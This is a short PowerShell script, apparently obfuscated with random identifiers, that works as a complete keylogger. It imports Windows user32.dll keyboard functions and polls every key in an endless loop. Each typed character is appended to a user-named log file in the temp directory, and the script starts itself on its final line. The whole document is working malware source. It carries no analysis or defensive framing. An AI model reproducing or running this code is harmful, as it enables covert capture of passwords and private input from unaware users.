function tEQhMSegZGUC($FJmpXQHNRfvyTz = "$env:temp/$env:Username.log"){
    echo "" >> $FJmpXQHNRfvyTz
$eZbIHYOnfxXGVt = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keyboardState);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyboardState, System.Text.StringBuilder buffer, int bufferSize, uint uFlag);
'@
    $agLxbwUIZXPOroqHt = Add-Type -MemberDefinition $eZbIHYOnfxXGVt -Name 'Win32' -Namespace API -PassThru
    try{
        while ($true) {
            Start-Sleep -Milliseconds 40
            for ($PQJdCLTcuVURlz = 9; $PQJdCLTcuVURlz -le 254; $PQJdCLTcuVURlz++) {
                $UdEQtfRobiZrk = $agLxbwUIZXPOroqHt::GetAsyncKeyState($PQJdCLTcuVURlz)
                if($UdEQtfRobiZrk -eq -32767){
                    $null = [console]::CapsLock
                    $MGqXFsZJakEim = $agLxbwUIZXPOroqHt::MapVirtualKey($PQJdCLTcuVURlz, 3)
                    $BATaShIONHcbZwYeE =  New-Object Byte[] 256
                    $NhVFbjTJwlrUPCu = $agLxbwUIZXPOroqHt::GetKeyboardState($BATaShIONHcbZwYeE)
                    $gyVnRWZKLdNlMp = New-Object -TypeName System.Text.StringBuilder
                    if($agLxbwUIZXPOroqHt::ToUnicode($PQJdCLTcuVURlz, $MGqXFsZJakEim, $BATaShIONHcbZwYeE, $gyVnRWZKLdNlMp, $gyVnRWZKLdNlMp.Capacity, 0)){
                        [System.IO.File]::AppendAllText($FJmpXQHNRfvyTz, $gyVnRWZKLdNlMp, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally{
    }
}
tEQhMSegZGUC